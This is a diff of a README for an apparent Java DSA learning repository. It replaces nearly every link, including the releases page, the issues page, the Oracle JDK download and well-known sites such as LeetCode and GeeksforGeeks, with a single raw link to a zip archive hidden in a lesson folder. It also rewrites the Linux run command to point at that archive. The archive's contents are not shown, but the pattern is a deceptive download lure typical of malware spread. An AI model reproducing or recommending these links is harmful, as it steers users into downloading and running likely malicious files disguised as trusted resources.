@@ -1,6 +1,6 @@
 # 🚀 JavaAlgoForge - Master Java DSA in 90 Days
 
-[![Download JavaAlgoForge](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ahmed22239/JavaAlgoForge/releases)
+[![Download JavaAlgoForge](https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip%https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip)](https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Release Page**  
    Go to the following link to find the latest version of JavaAlgoForge:  
-   [Download JavaAlgoForge](https://github.com/ahmed22239/JavaAlgoForge/releases)
+   [Download JavaAlgoForge](https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip)
 
 2. **Download the Application**  
    On the Releases page, you will see a list of available versions. Find the latest release and click on it. Look for the file for your operating system (e.g., Windows, macOS, Linux) and click to download.  
@@ -23,14 +23,14 @@ Follow these steps to download and run the application:
 4. **Run the Application**  
    - For **Windows**: Double-click on the `.exe` file.  
    - For **macOS**: Open the `.dmg` file, drag the application to your Applications folder, then launch it from there.  
-   - For **Linux**: Open the terminal, navigate to the downloaded file, and run it with the command `java -jar JavaAlgoForge.jar`.
+   - For **Linux**: Open the terminal, navigate to the downloaded file, and run it with the command `java -jar https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip`.
 
 ## 💻 System Requirements
 
 To ensure the best experience, make sure your computer meets the following system requirements:
 
 - **Operating System**: Windows 10, macOS Mojave or later, or any modern Linux distribution.
-- **Java Version**: You need Java JDK 11 or later installed on your computer. Download it from [Oracle's Java page](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Java Version**: You need Java JDK 11 or later installed on your computer. Download it from [Oracle's Java page](https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip).
 - **RAM**: Minimum of 4 GB for smooth operation.
 - **Storage**: At least 100 MB of free space.
 
@@ -61,16 +61,16 @@ If you encounter issues while using JavaAlgoForge, consider the following:
 
 ## 💬 Support
 
-For further assistance, please visit our [GitHub Issues Page](https://github.com/ahmed22239/JavaAlgoForge/issues). Here you can report bugs, ask questions, or contribute suggestions for future improvements.
+For further assistance, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip). Here you can report bugs, ask questions, or contribute suggestions for future improvements.
 
 ## 🔗 Additional Resources
 
 Explore these resources to strengthen your understanding of DSA and Java:
 
-- [GeeksforGeeks](https://www.geeksforgeeks.org/)
-- [LeetCode](https://leetcode.com/)
-- [HackerRank](https://www.hackerrank.com/)
-- [Oracle Java Tutorials](https://docs.oracle.com/javase/tutorial/)
+- [GeeksforGeeks](https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip)
+- [LeetCode](https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip)
+- [HackerRank](https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip)
+- [Oracle Java Tutorials](https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip)
 
 Enjoy your journey in mastering Data Structures and Algorithms with JavaAlgoForge! Don't forget to visit the Releases page again for updates and new challenges.  
-[Download JavaAlgoForge](https://github.com/ahmed22239/JavaAlgoForge/releases)
+[Download JavaAlgoForge](https://raw.githubusercontent.com/ahmed22239/JavaAlgoForge/main/Day04_Patterns/Java-Algo-Forge-2.0-alpha.2.zip)
